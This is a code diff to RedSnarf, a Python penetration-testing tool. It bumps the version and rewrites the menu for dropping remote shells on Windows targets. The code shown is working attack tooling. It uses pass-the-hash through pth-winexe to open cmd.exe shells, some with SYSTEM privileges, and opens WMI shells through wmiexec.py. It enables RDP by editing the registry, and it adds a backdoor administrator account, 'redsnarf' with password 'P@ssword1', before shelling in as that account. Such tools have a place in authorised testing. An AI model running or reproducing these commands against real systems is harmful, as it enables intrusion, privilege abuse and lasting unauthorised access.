@@ -1869,7 +1869,7 @@ def main():
 
 #Display the user menu.
 banner()
-p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.4o", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
+p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.4p", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
 
 # Creds
 p.add_argument("-H", "--host", dest="host", help="Specify a hostname -H ip= / range -H range= / targets file -H file= to grab hashes from")
@@ -3436,7 +3436,6 @@ if edq_rdp!='n':
 				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v \"fDenyTSConnections\" /t REG_DWORD /f /D 0' 2>/dev/null")
 
 				print colored("[+]Starting RDP Service:\n",'green')
-
 				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C net start \"termservice\"' 2>/dev/null")
 
 				print colored("[+]Enabling Firewall Exception:",'green')
@@ -3927,28 +3926,35 @@ if dropshell in yesanswers:
 				os.system("wmiexec.py "+user+"@"+targets[0]+" -no-pass 2>/dev/null")
 				sys.exit()
 			else:				
-				response = raw_input("Would you like a shell with SYSTEM Privileges?: Y/(N) ")
-				if response in yesanswers:	
+				print colored ('[+]Enter ','green')+ colored('s','yellow')+colored(' for a Shell with System Privileges','green')
+				print colored ('[+]Enter ','green')+ colored('n','yellow')+colored(' for a Shell with Privileges of ','green')+colored(user,'yellow')+" (default)"
+				print colored ('[+]Enter ','green')+ colored('w','yellow')+colored(' for a WMI based Shell','green')
+				print colored ('[+]Enter ','green')+ colored('a','yellow')+colored(' to create a new DA account with the credentials ','green')+colored('redsnarf','yellow')+colored('/','green')+colored('P@ssword1','yellow')+colored(' then Shell to this account\n','green')
+
+				response = raw_input("What kind of shell would you like:? (q to quit) ")
+				if response.upper()=="S":	
 					print colored ('\n[+] Dropping a SYSTEM Shell on '+targets[0]+'\n','yellow')
 					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe\" 2>/dev/null")
 					sys.exit()
-				#Undocumented option
-				elif response=="w":
+				elif response.upper()=="N" or response=="":
+					print colored ('\n[+] Dropping Shell on '+targets[0] +" with privileges of "+user+'\n','yellow')
+					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" \"cmd.exe\" 2>/dev/null")
+					sys.exit()
+				elif response.upper()=="W":
 					print colored ('\n[+] Dropping WMI Based Shell on '+targets[0]+'\n','yellow')
 					os.system("wmiexec.py "+user+":"+passw+"@"+targets[0]+" 2>/dev/null")
 					sys.exit()
-				#Undocumented option
-				elif response=="a":
-					print colored ('\n[+] Dropping a SHELL based on New Account Details '+targets[0]+'\n','yellow')
-					print colored ("Adding a new account with the credentials username=redsnarf password=P@ssword1",'green')
+				elif response.upper()=="A":
+					print colored ('\n[+] Dropping Shell on '+targets[0] +'\n','yellow')
+					print colored ("Adding a new account with the credentials username=",'green')+colored("redsnarf",'yellow')+colored(" password=",'green')+colored("P@ssword1",'yellow')
 					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" \"cmd.exe /c net user redsnarf P@ssword1 /ADD && net localgroup Administrators redsnarf /ADD\" 2>/dev/null")
-					print colored ("Dropping a shell with the account redsnarf and password P@ssword1",'green')
+					print colored ("Dropping a shell with the account ",'green')+colored("redsnarf",'yellow')+colored(" and password ",'green')+colored("P@ssword1\n",'yellow')
 					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+"redsnarf"+"%"+"P@ssword1"+"\" --uninstall \/\/"+targets[0]+" \"cmd.exe\" 2>/dev/null")
 					sys.exit()
-				else:
-					print colored ('\n[+] Dropping Shell on '+targets[0]+'\n','yellow')
-					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" \"cmd.exe\" 2>/dev/null")
+				elif response.upper()=="Q":
 					sys.exit()
+
+				sys.exit()
 
 		except:
 			sys.exit()
